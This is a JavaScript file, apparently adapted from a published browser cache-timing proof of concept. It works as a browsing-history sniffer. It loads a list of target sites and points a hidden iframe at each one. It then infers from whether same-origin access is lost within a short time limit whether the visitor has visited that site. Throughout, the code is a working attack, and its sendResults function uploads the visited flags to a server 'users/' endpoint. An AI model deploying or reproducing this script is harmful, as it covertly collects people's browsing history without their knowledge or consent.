/****************
 * SCANNED URLS *
 ****************/

// [{name:slickdeals, urls:[http://slickdeals.com]}]
var targets;

// [{name: slickdeals, visited: true}]
var results =[]

$.get( "apps/", function( data ) {
    targets = data;
}, "json" );


/*************************
 * CONFIGURABLE SETTINGS *
 *************************/

var TIME_LIMIT = 3; /* used to be 2 */
var MAX_ATTEMPTS = 1;

/**********************
 * MAIN STATE MACHINE *
 **********************/

var log_area;

var target_off = 0;
var attempt = 0;
var confirmed_visited = false;

var current_url, current_name;
var wait_cycles;

var frame_ready = false;

var urls;

/* The frame points to about:blank. Initialize a new test, giving the
 about:blank frame some time to fully load. */

function performCheck() {

    wait_cycles = 0;

    setTimeout(waitForAboutBlankToLoad, 1);

}


/* Confirm that about:blank is loaded correctly. */

function waitForAboutBlankToLoad() {

    if (wait_cycles++ > 100) {
        alert('Something went wrong, sorry.');
        return;
    }

    try {

        if (frames['f'].location.href != 'about:blank') throw 1;

        frames['f'].stop();
        document.getElementById('f').src ='javascript:"<body onload=\'parent.frame_ready = true\'>"';

        setTimeout(waitForFrameReady, 1);

    } catch (e) {

        setTimeout(waitForAboutBlankToLoad, 1);

    }

}


function waitForFrameReady() {

    if (wait_cycles++ > 100) {
        alert('Something went wrong, sorry.');
        return;
    }

    if (!frame_ready) {

        setTimeout(waitForFrameReady, 1);

    } else {

        frames['f'].stop();
        setTimeout(navigateToTarget, 1);

    }

}



/* Navigate the frame to the target URL. */

function navigateToTarget() {

    cycles = 0;

    setTimeout(waitForNoread, 1);

    urls++;
    document.getElementById("f").src = current_url;

}


/* The browser is now trying to load the destination URL. Let's see if
 we lose SOP access before we hit TIME_LIMIT. If yes, we have a cache
 hit. If not, seems like cache miss. In both cases, abort pending
 navigation by pointing the frame back to about:blank when done. */

function waitForNoread() {

    try {

        if (frames['f'].location.href == undefined) throw 1;


        if (cycles++ >= TIME_LIMIT) {

            maybeTestNext();
            return;

        }

        setTimeout(waitForNoread, 1);

    } catch (e) {

        confirmed_visited = true;
        maybeTestNext();

    }

}


/* Just a logging helper. */

function log_text(str, type, cssclass) {

    var el = document.createElement(type);
    var tx = document.createTextNode(str);

    el.className = cssclass;
    el.appendChild(tx);

    log_area.appendChild(el);

}

function track(siteName, cycleCount, attemptCount, wasVisited){
    var cssClass = 'not_visited'
    if(wasVisited){
        cssClass = 'visited'
    }
    results.push( {name: siteName, wasVisited: wasVisited})
    log_text(cssClass + ': ' + siteName + ' [' + cycleCount + ':' + attemptCount + ']', 'li', cssClass);
}


/* Decides what to do next. May schedule another attempt for the same target,
 select a new target, or wrap up the scan. */

function sendResults() {
    $.ajax({
        type: "PUT",
        url: "users/",
        data: { user:{apps: results}}
    })
        .done(function( msg ) {
            alert( "Data Saved: " + JSON.stringify(msg) );
        });
}
function maybeTestNext() {

    frame_ready = false;

    document.getElementById('f').src = 'about:blank';


    if (target_off < targets.length) {

        if (targets[target_off].category) {

            log_text(targets[target_off].category + ':', 'p', 'category');
            target_off++;

        }


        if (confirmed_visited) {

            track(current_name, cycles,attempt, true)

        }

        if (confirmed_visited || attempt == MAX_ATTEMPTS * targets[target_off].urls.length) {

            if (!confirmed_visited)
                track(current_name, cycles,attempt, false)

            confirmed_visited = false;
            target_off++;
            attempt = 0;

            maybeTestNext();

        } else {

            current_url = targets[target_off].urls[attempt % targets[target_off].urls.length];
            current_name = targets[target_off].name;

            attempt++;

            performCheck();

        }

    } else {

        sendResults()
        document.getElementById('btn').disabled = false;

    }

}


/* The handler for "run the test" button on the main page. Dispenses
 advice, resets state if necessary. */

function start_stuff() {

    if (navigator.userAgent.indexOf('Chrome/') == -1 &&
        navigator.userAgent.indexOf('Opera/') == -1) {

        alert('This proof-of-concept is specific to Chrome and Opera, and probably won\'t work for you.\n\n' +
        'Versions for other browsers can be found here:\n' +
        'http://lcamtuf.coredump.cx/cachetime/');

    }

    target_off = 0;
    attempt = 0;
    confirmed_visited = false;
    results = []

    document.getElementById('btn').disabled = true;

    log_area = document.getElementById('log');
    log_area.innerHTML = '';

    st = (new Date()).getTime();
    urls = 0;

    maybeTestNext();

}

